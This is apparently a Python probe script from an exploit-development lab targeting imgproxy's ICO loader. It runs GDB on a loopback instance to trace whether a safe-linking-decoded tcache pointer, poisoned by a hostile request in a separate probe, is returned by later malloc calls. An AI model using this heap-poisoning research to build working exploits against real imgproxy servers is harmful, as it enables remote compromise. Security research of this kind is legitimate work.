#!/usr/bin/env python3
"""W11b: can a second natural HTTP request consume the wire-decoded head?

Loopback only. Reuses the committed W9 probe verbatim except for its GDB
script, which follows twenty natural malloc(0x20) calls, and one extra action:
after the hostile GET completes, a benign GET is issued to the same live
imgproxy process. GDB still only observes (breakpoints, finish, continue);
no memory writes and no forced calls.

Usage:
    W8_OUTDIR=/tmp/out python3 ico_post_request_consume.py TAG LOW N PRELOAD gdb SIZE BINARY
"""
import http.client
import importlib.util
import sys
import time

PROBE = ("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/imgproxy2shell/"
         "provision/ico_post_poison_trace.py")

HEAD = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND 127.0.0.1:18180
set environment IMGPROXY_BASE_URL http://127.0.0.1:18181/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT rdx=%p\\n", $rdx
set $dst = $rsi
finish
printf "GDB_TCACHE_PRE head=%p count=%d thread=%d tcache=%p\\n", tcache->entries[1], tcache->counts[1], $_thread, tcache
set $pos = $dst + 18
set $raw = *(unsigned long long *)$pos
set $wire = (void *)($raw ^ ((unsigned long)$pos >> 12))
printf "GDB_WIRE_DECODED %p RAW %p POS %p\\n", $wire, $raw, $pos
break malloc if $rdi == 0x20
continue
"""

body = []
for i in range(1, 21):
    if i == 7:
        body.append('break vips_foreign_load_ico_header\n')
        body.append('continue\n')
        body.append('printf "GDB_SECOND_HIT thread=%d head=%p count=%d\\n", '
                    '$_thread, tcache->entries[1], tcache->counts[1]\n')
    body.append(f'printf "GDB_M{i}_HIT size=%p thread=%d head=%p count=%d\\n", '
                '$rdi, $_thread, tcache->entries[1], tcache->counts[1]\n')
    body.append('finish\n')
    body.append(f'printf "GDB_M{i}_RET %p WIRE=%d thread=%d\\n", $rax, '
                '(unsigned long)$rax == (unsigned long)$wire, $_thread\n')
    body.append(f'printf "GDB_M{i}_AFTER head=%p count=%d\\n", '
                'tcache->entries[1], tcache->counts[1]\n')
    if i < 20:
        body.append('continue\n')
GDB = HEAD + "".join(body) + "quit\n"

spec = importlib.util.spec_from_file_location("w11probe", PROBE)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
mod.GDB = GDB

real_sleep = time.sleep


def sleep_with_second_request(sec):
    # The committed probe calls sleep(0.3) only after the hostile GET.
    if sec == 0.3:
        try:
            conn = http.client.HTTPConnection("127.0.0.1", 18180, timeout=8)
            conn.request("GET", "/insecure/rs:fill:16:16/plain/benign.ico",
                         headers={"Host": "127.0.0.1"})
            resp = conn.getresponse()
            print(f"W11B second status={resp.status} len={len(resp.read(200))}",
                  flush=True)
            conn.close()
        except Exception as exc:
            print(f"W11B second {type(exc).__name__}: {exc}", flush=True)
    return real_sleep(sec)


mod.time.sleep = sleep_with_second_request
sys.exit(mod.main())
